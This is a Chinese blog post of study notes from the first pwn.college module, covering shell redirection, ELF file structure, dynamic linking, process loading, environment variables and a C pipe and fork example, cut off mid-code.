

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" href="/img/favicon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Yogdzewa">
  <meta name="keywords" content="">
  
    <meta name="description" content="冲">
<meta property="og:type" content="article">
<meta property="og:title" content="pwn modules的一点笔记">
<meta property="og:url" content="https://yogdzewa.github.io/2022-01/Now-pwn-modules/index.html">
<meta property="og:site_name" content="Yogdzewa">
<meta property="og:description" content="冲">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220117165401525.png">
<meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/photo_2018-01-13_11-28-32.jpg">
<meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220426223702228.png">
<meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220430102917561.png">
<meta property="article:published_time" content="2022-01-16T14:00:00.000Z">
<meta property="article:modified_time" content="2022-04-30T16:12:58.367Z">
<meta property="article:author" content="Yogdzewa">
<meta property="article:tag" content="PWN">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220117165401525.png">
  
  
  <title>pwn modules的一点笔记 - Yogdzewa</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/obsidian.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
  


<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"yogdzewa.github.io","root":"/","version":"1.8.13","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":"§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.4.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>(￣.￣)</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                友链
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('/image/edit2.jpg') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="pwn modules的一点笔记">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2022-01-16 22:00" pubdate>
        2022年1月16日 晚上
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      56k 字
    </span>
  

  
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      697 分钟
    </span>
  

  
  
    
      <!-- 不蒜子统计文章PV -->
      <span id="busuanzi_container_page_pv" style="display: none">
        <i class="iconfont icon-eye" aria-hidden="true"></i>
        <span id="busuanzi_value_page_pv"></span> 次
      </span>
    
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">pwn modules的一点笔记</h1>
            
              <p class="note note-info">
                
                  不可视境界线最后变动于：2022年5月1日 凌晨
                
              </p>
            
            <div class="markdown-body">
              <ul>
<li><p>连接</p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">ssh -i ~/pwn.college/pwnkey hacker@dojo.pwn.college <br></code></pre></div></td></tr></table></figure></li>
<li><p>传文件到dojo或拉取</p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">scp -i ~/pwn.college/pwnkey [文件] hacker@dojo.pwn.college:<br>scp -i ~/pwn.college/pwnkey hacker@dojo.pwn.college:[文件] ./<br></code></pre></div></td></tr></table></figure></li>
<li><p><strong>可以创建flag的符号链接, 不过除了$HOME其他目录均不能写, 只能在<code>~/</code>下.</strong> </p>
</li>
</ul>
<h1 id="module-1"><a href="#module-1" class="headerlink" title="module 1"></a>module 1</h1><h2 id="The-file-system"><a href="#The-file-system" class="headerlink" title="The file system"></a>The file system</h2><p><img src="../../image/pwn-modules/image-20220117165401525.png" srcset="/img/loading.gif" lazyload alt="image-20220117165401525"></p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">ln -s /old/path /new/path<br>&lt;in_file:      redirect in_file into the command&#x27;s input<br><span class="hljs-meta">&gt;</span><span class="bash">out_file:     redirect the <span class="hljs-built_in">command</span><span class="hljs-string">&#x27;s output into out_file, overwriting it</span></span><br><span class="hljs-meta">&gt;</span><span class="bash"><span class="hljs-string">&gt;out_file:    redirect the command&#x27;</span>s output into out_file, appending to it</span><br><span class="hljs-meta">2&gt;</span><span class="bash">error_file:  redirect the <span class="hljs-built_in">command</span><span class="hljs-string">&#x27;s errors into error_file, overwriting it</span></span><br><span class="hljs-meta">2&gt;</span><span class="bash"><span class="hljs-string">&gt;error_file: redirect the command&#x27;</span>s errors into error_file, appending to it</span><br></code></pre></div></td></tr></table></figure>

<h2 id="Binary-files"><a href="#Binary-files" class="headerlink" title="Binary files"></a>Binary files</h2><blockquote>
<p>pwn.college的教程还是挺绝的, slide可以做为基础知识的详细参考资料. Binaryfiles的slide在<a target="_blank" rel="noopener" href="https://docs.google.com/presentation/d/1wrX8tvwaxIEk5hx4OtQmPqps-MScIaDO-9bTKQqr8vI/edit#slide=id.g9265d66f8d_0_26">这里</a> </p>
<p><a target="_blank" rel="noopener" href="https://www.intezer.com/blog/research/executable-linkable-format-101-part1-sections-segments/">ELF base struct: header-sections-segments</a><br><a target="_blank" rel="noopener" href="https://www.intezer.com/blog/elf/executable-linkable-format-101-part-2-symbols/">symbols</a><br><a target="_blank" rel="noopener" href="https://www.intezer.com/blog/elf/executable-and-linkable-format-101-part-3-relocations/">relocations</a><br><a target="_blank" rel="noopener" href="https://www.intezer.com/blog/elf/executable-linkable-format-101-part-4-dynamic-linking/">dynamic-linking</a> </p>
</blockquote>
<ul>
<li>ELF is a binary file format.<br>  Contains the program and its data.Describes how the program should be loaded (<em>program/segment headers</em>).Contains metadata describing program components (<em>section headers</em>).</li>
<li><strong>sections</strong> gather all needed information to link a given object file and build an executable,<br>  while <strong>Program Headers</strong> split the executable into segments with different attributes, which will eventually be loaded into memory.</li>
<li>Section headers are <em><strong>not</strong></em> a necessary part of the ELF. <em>Section headers</em> are just <strong>metadata</strong>.</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> file /bin/cat</span> <br>/bin/cat: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e6afa43e1e280bd06c018f541c7ae46a2ebda83c, for GNU/Linux 3.2.0, stripped<br></code></pre></div></td></tr></table></figure>

<ul>
<li>Several ways to dig in: 在CSAPP里, 当初看的时候被我忽略掉了…<ul>
<li><input checked="" disabled="" type="checkbox"> <strong>gcc</strong> to make your ELF.</li>
<li><input checked="" disabled="" type="checkbox"> <strong>readelf</strong> to parse the ELF header.</li>
<li><input checked="" disabled="" type="checkbox"> <strong>objdump</strong> to parse the ELF header and disassemble the source code.</li>
<li><input checked="" disabled="" type="checkbox"> <strong>nm</strong> to view your ELF’s symbols.</li>
<li><input disabled="" type="checkbox"> <strong>patchelf</strong> to change some ELF properties.</li>
<li><input checked="" disabled="" type="checkbox"> <strong>objcopy</strong> to swap out ELF sections.</li>
<li><input disabled="" type="checkbox"> <strong>strip</strong> to remove otherwise-helpful information (such as symbols).</li>
<li><input disabled="" type="checkbox"> <a target="_blank" rel="noopener" href="https://ide.kaitai.io/"><strong>kaitai struct</strong></a> to look through your ELF interactively</li>
</ul>
</li>
</ul>
<h3 id="ELF-base-struct"><a href="#ELF-base-struct" class="headerlink" title="ELF base struct"></a>ELF base struct</h3><p>ELF files are composed of three major components:</p>
<ul>
<li><strong>ELF Header</strong> : contains general information about the binary <code>readelf -h &lt;executable&gt;</code> </li>
<li><strong>Sections</strong> : comprise all information needed for linking a target object file in order to build a working executable <code>readelf -S &lt;executable&gt;</code></li>
<li><strong>Segments</strong> : break down the structure of an ELF binary into suitable chunks to prepare the executable to be loaded into memory</li>
</ul>
<blockquote>
<p>每个section的意义还是要注意一下, 我又倒回来看.got.plt了</p>
</blockquote>
<p>注意segment在链接的时候没有作用, section在运行时没有作用.</p>
<p>一方面Segment通过把section分组来提高装载的效率, 另一方面要注意必须和物理页大小对齐, 以便于pte中的权限控制.</p>
<h3 id="Symbols"><a href="#Symbols" class="headerlink" title="Symbols"></a>Symbols</h3><p><strong>Provide interface to Linkers and Debuggers to enforce their functionality.</strong> </p>
<p>.dynstr是.dynsym的string table, The section <em>.strtab</em> is the <em>String Table</em> of <em>.symtab Symbol Table</em>. 而且string table的entry数量和symbol table的entry数量一致.</p>
<p><img src="../../image/pwn-modules/photo_2018-01-13_11-28-32.jpg" srcset="/img/loading.gif" lazyload></p>
<h3 id="relocation"><a href="#relocation" class="headerlink" title="relocation"></a>relocation</h3><ol>
<li><strong>Defining Relocations</strong> </li>
</ol>
<p>There are different types of <u>relocatable files</u>:</p>
<ul>
<li>Generic object files (*.o).     比较简单, 就是一个静态链接的文件.</li>
<li>Kernel object files (*.ko).     wait for future</li>
<li>Shared object files (*.so).    <ul>
<li>These type of relocatable files support being linked on runtime, and they may be shared across different processes. Consequently, relocations of dynamic dependencies have to be done at runtime. This process is known as Dynamic Linking.</li>
</ul>
</li>
</ul>
<p>Elfxx_Rel and Elfxx_Rela差在一个Addend上, 也就是要重定位的位置和下一条指令地址的差值<strong>取反</strong>.</p>
<p>其他的部分看原博客<a target="_blank" rel="noopener" href="https://www.intezer.com/blog/malware-analysis/executable-and-linkable-format-101-part-3-relocations/">就行</a>, 东西太多必须每一段意思都要懂, 不过重定位条目比较少也容易记住.</p>
<h3 id="Dynamic-Linking"><a href="#Dynamic-Linking" class="headerlink" title="Dynamic Linking"></a>Dynamic Linking</h3><h4 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h4><p>Unlike in static linking, <em><strong>ld</strong></em> requires shared libraries to create a dynamically linked executable.<br>The output file will contain the <strong>executable’s code</strong> and <strong>the names of the shared libraries</strong> required.</p>
<p>When the binary is executed, the dynamic linker will find the required dependencies to <strong>load</strong> and link them together.</p>
<h4 id="Process"><a href="#Process" class="headerlink" title="Process"></a>Process</h4><p>The dynamic linking process begins immediately after execution.</p>
<p>With dynamically linked programs, the system executes the file’s “<strong>interpreter</strong>”, which is an <u>intermediate</u> program that should <strong>set up the environment and only then execute the main binary</strong>. The interpreter lies in the <em>PT_INTERP</em> segment created by the compile-time linker (<em><strong>ld</strong></em>).</p>
<p>The dynamic linker will <strong>set up the environment</strong> <u>using dynamic entries</u> from the <em>.dynamic</em> section:</p>
<p>preparing the environment:</p>
<ol>
<li>Load the original file’s PT_LOAD segments in memory.</li>
<li>Use the <em>.dynamic</em> section/segment to read dependencies, search for them on disk and load them in memory as well. This is done recursively for dependent libraries—they can be dynamically linked as well. The dependency searching algorithm is outlined in the <a target="_blank" rel="noopener" href="http://man7.org/linux/man-pages/man8/ld.so.8.html">ld.so man page</a>.</li>
<li>Perform relocations – shared libraries are loaded into non-deterministic addresses and must have absolute addresses patched, as well as resolving references to other object files.</li>
<li>Invoke shared library initialization functions (registered in the <em>.preinit_array, .init, .init_array</em> sections). <strong>What happened?</strong> </li>
<li>Finally, pass control back to the original binary’s entry point, making it seem to the binary that control was passed directly from <em>exec</em>.</li>
</ol>
<p>还讲到了<strong>LD_PRELOAD</strong>和<strong>LD_LIBRARY_PATH</strong>变量…还是看原文吧…</p>
<h4 id="Lazy-Linking"><a href="#Lazy-Linking" class="headerlink" title="Lazy Linking"></a>Lazy Linking</h4><p>lazy linking的原因是如果一个程序开头出错了马上退出, rendering useless all of the relocation work performed by the dynamic linker, 所以将一些链接工作放到实际调用的时候.</p>
<p>在CSAPP中看过了, 基本相同, 不同在于提供了IDA的视图看法.</p>
<h2 id="Process-Loading"><a href="#Process-Loading" class="headerlink" title="Process Loading"></a>Process Loading</h2><ol>
<li><p>A process is created.</p>
<p> by fork() or clone() and execve().</p>
</li>
<li><p>Cat is loaded.</p>
<ul>
<li><p>must be executable</p>
<p>To figure out what to load, the Linux kernel reads the beginning of the file (i.e., /bin/cat), and makes a decision:</p>
</li>
<li><p>If the file starts with <strong>#!</strong>, the kernel extracts the interpreter from the rest of that line and executes this interpreter with the original file as an argument.</p>
</li>
<li><p>If the file matches a format in <strong>/proc/sys/fs/binfmt_misc</strong>, the kernel executes the interpreter specified for that format with the original file as an argument.</p>
</li>
<li><p>If the file is a <strong>dynamically-linked</strong> ELF, the kernel reads the interpreter/loader defined in the ELF, loads the interpreter and the original file, and lets the interpreter take control.</p>
</li>
<li><p>If the file is a <strong>statically-linked</strong> ELF, the kernel will load it.Other legacy file formats are checked for</p>
<p>notice the interpreter specified in .interp section.</p>
<p><strong>Dynamically linked ELFs: the loading process</strong> </p>
</li>
<li><p>The program and its interpreter are <u>loaded by the kernel</u>.</p>
</li>
<li><p>The interpreter <u>locates the libraries</u>.<br>  a. LD_PRELOAD environment variable, and anything in /etc/ld.so.preload<br>  b. LD_LIBRARY_PATH environment variable (can be set in the shell)<br>  c. DT_RUNPATH or DT_RPATH specified in the binary file (both can be modified with patchelf)<br>  d.system-wide configuration (/etc/ld.so.conf)<br>  e. /lib and /usr/lib</p>
</li>
<li><p>The interpreter <u>loads the libraries</u>.<br>  a.  these libraries can depend on other libraries, causing more to be loadedb.relocations updated</p>
</li>
</ul>
</li>
<li><p><a target="_blank" rel="noopener" href="https://docs.google.com/presentation/d/1TwM5WLWnTqrNkpXjGKkaXYbKZEpatEQYA7ckBVXAOhs/edit#slide=id.g40953d030c_0_179">Cat is initialized</a>.</p>
<p> <strong>/proc/self/maps</strong> and <strong>attribute((constructor))</strong> </p>
</li>
</ol>
<p>Further readings:</p>
<p><a target="_blank" rel="noopener" href="https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-4.html">How does the Linux kernel run a program</a> </p>
<p><a target="_blank" rel="noopener" href="https://gist.github.com/CMCDragonkai/10ab53654b2aa6ce55c11cfc5b2432a4">Linux: Understanding the Memory Layout of Linux Executables</a> </p>
<h2 id="Process-Execution"><a href="#Process-Execution" class="headerlink" title="Process Execution"></a>Process Execution</h2><p>用命令行演示了非常多的内容, 基本都没见过我尽量记录下一些细节. <a target="_blank" rel="noopener" href="https://docs.google.com/presentation/d/1ezY9Q8I0tzDD-7ZDXMbQM5RQ7z1dvB9-U_nDEhc6qdE/edit#slide=id.g9279416eed_1_114">谷歌文档</a> </p>
<ol>
<li>Cat is launched.</li>
<li>Cat reads its arguments and environment.</li>
<li>Cat does its thing.</li>
<li>Cat terminates. </li>
</ol>
<p>上面四个是这一部分要考虑的流程, 我也按流程走:</p>
<h3 id="Cat-is-launched"><a href="#Cat-is-launched" class="headerlink" title="Cat is launched"></a>Cat is launched</h3><p><code>__libc_start_main()</code>, 又是这个函数, 不过在这之前还有一个<code>_start()</code>, 形成<code>_start()-&gt;__libc_start_main()-&gt;main()</code>流程.</p>
<blockquote>
<p>可以指定一下LD_PRELOAD参数来改变__libc_start_main()之类的操作</p>
</blockquote>
<h3 id="Cat-reads-arg-amp-env"><a href="#Cat-reads-arg-amp-env" class="headerlink" title="Cat reads arg &amp; env"></a>Cat reads arg &amp; env</h3><p>在下一节中有介绍, 视频里示范了一个改环境变量的例子.</p>
<p>在执行ls指令的时候 添加<code>LANG = C</code>环境变量, 会导致排序按照ASCII码, 否则会按照系统默认的<code>en_US-UTF-8</code> </p>
<h3 id="Cat-does-thing"><a href="#Cat-does-thing" class="headerlink" title="Cat does thing"></a>Cat does thing</h3><p>讲到了库函数, 系统调用, 信号, 共享内存. </p>
<p>通过nm指令来查看symbol, strace的使用, 以及libc库函数可以不用写头文件, 不过会引起一个隐式声明警告, 可以通过man来查看需要引用什么头文件. </p>
<p>信号演示的时候用了<code>ps pgrep</code>两个指令, 看ps的manual知道了参数有三种风格. 共享内存演示了/dev/shm, <strong>还不知道这怎么用</strong> </p>
<p>还有一个进程terminate, 和我在操作系统中看到的一致, 不重复了.</p>
<p>剩下的在PPT里.</p>
<h2 id="命令行参数和环境变量"><a href="#命令行参数和环境变量" class="headerlink" title="命令行参数和环境变量"></a>命令行参数和环境变量</h2><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">char</span> **envp)</span></span><br></code></pre></div></td></tr></table></figure>

<p>main函数的参数, 其中argv和envp是字符串数组的指针, 所以是二重指针, 两个数组的最后一个元素是null.</p>
<p>就像这样子:</p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gcc -o <span class="hljs-built_in">test</span> test.c</span><br><span class="hljs-meta">$</span><span class="bash"> ./<span class="hljs-built_in">test</span> testing</span><br>The number of arguments is: 2<br><br>First arg:     The program name is: ./test<br>Second arg: The first argument is: testing<br><br>The first environment variable is: PWD=/home/yans # process working directory<br>The second environment variable is: SHLVL=1<br></code></pre></div></td></tr></table></figure>

<p><code>env</code> runs a command with a modified environment. 也可以设置特定的环境变量.</p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> env -i ./countenv</span>                   <br>There are 0 environment variables.<br></code></pre></div></td></tr></table></figure>

<h2 id="PIPE"><a href="#PIPE" class="headerlink" title="PIPE"></a>PIPE</h2><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">subprocess</span> &#123;</span><br>    <span class="hljs-keyword">int</span> pid;<br>    <span class="hljs-keyword">int</span> <span class="hljs-built_in">stdin</span>;<br>    <span class="hljs-keyword">int</span> <span class="hljs-built_in">stdout</span>;<br>    <span class="hljs-keyword">int</span> <span class="hljs-built_in">stderr</span>;<br>&#125;;<br><span class="hljs-keyword">void</span> __close(<span class="hljs-keyword">int</span> fd) &#123;<br>    <span class="hljs-keyword">if</span> (close(fd) == <span class="hljs-number">-1</span>) &#123; perror(<span class="hljs-string">&quot;Could not close pipe end&quot;</span> ); <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>); &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">mk_pipe</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fds[<span class="hljs-number">2</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (pipe(fds) == <span class="hljs-number">-1</span>) &#123; perror(<span class="hljs-string">&quot;Could not create pipe&quot;</span>); <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>); &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">mv_fd</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd1, <span class="hljs-keyword">int</span> fd2)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (dup2(fd1,  fd2) == <span class="hljs-number">-1</span>) &#123; perror(<span class="hljs-string">&quot;Could not duplicate pipe end&quot;</span>); <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>); &#125;<br>    __close(fd1);<br>&#125;<br><br><span class="hljs-comment">// Start program at argv[0] with arguments argv.</span><br><span class="hljs-comment">// Set up new stdin, stdout and stderr.</span><br><span class="hljs-comment">// Puts references to new process and pipes into `p`.</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">call</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* argv[], struct subprocess * p)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> child_in[<span class="hljs-number">2</span>]; <span class="hljs-keyword">int</span> child_out[<span class="hljs-number">2</span>]; <span class="hljs-keyword">int</span> child_err[<span class="hljs-number">2</span>];<br>    pipe(child_in); pipe(child_out); pipe(child_err);<br>    <span class="hljs-keyword">int</span> pid = fork();<br>    <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>) &#123;<br>        __close(<span class="hljs-number">0</span>); __close(<span class="hljs-number">1</span>); __close(<span class="hljs-number">2</span>);                                 <span class="hljs-comment">// __close parent pipes</span><br>        __close(child_in[<span class="hljs-number">1</span>]); __close(child_out[<span class="hljs-number">0</span>]); __close(child_err[<span class="hljs-number">0</span>]); <span class="hljs-comment">// unused child pipe ends</span><br>        mv_fd(child_in[<span class="hljs-number">0</span>], <span class="hljs-number">0</span>); mv_fd(child_out[<span class="hljs-number">1</span>], <span class="hljs-number">1</span>); mv_fd(child_err[<span class="hljs-number">1</span>], <span class="hljs-number">2</span>);<br>        <span class="hljs-keyword">char</span>* envp[] = &#123; <span class="hljs-string">&quot;\0&quot;</span> &#125;;<br>        <span class="hljs-comment">//write(1,&quot;what the fuck&quot;, 30);</span><br>        <span class="hljs-keyword">int</span> r=execve(<span class="hljs-string">&quot;/challenge/embryoio_level40&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>        write(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;failure in exec&quot;</span>, <span class="hljs-number">30</span>) ;<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        __close(child_in[<span class="hljs-number">0</span>]); __close(child_out[<span class="hljs-number">1</span>]); __close(child_err[<span class="hljs-number">1</span>]); <span class="hljs-comment">// unused child pipe ends</span><br>        p-&gt;pid = pid;<br>        p-&gt;<span class="hljs-built_in">stdin</span> = child_in[<span class="hljs-number">1</span>];   <span class="hljs-comment">// parent wants to write to subprocess child_in</span><br>        p-&gt;<span class="hljs-built_in">stdout</span> = child_out[<span class="hljs-number">0</span>]; <span class="hljs-comment">// parent wants to read from subprocess child_out</span><br>        p-&gt;<span class="hljs-built_in">stderr</span> = child_err[<span class="hljs-number">0</span>]; <span class="hljs-comment">// parent wants to read from subprocess child_err</span><br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello from parent process!\n&quot;</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">subprocess</span> <span class="hljs-title">proc</span>;</span><br>    <span class="hljs-keyword">char</span>* argv[] = &#123;<span class="hljs-string">&quot;/challenge/embryoio_level40&quot;</span>, <span class="hljs-string">&quot;\0&quot;</span>&#125;;<br>    call(argv, &amp;proc);<br><span class="hljs-comment">//    mv_fd(STDIN_FILENO, 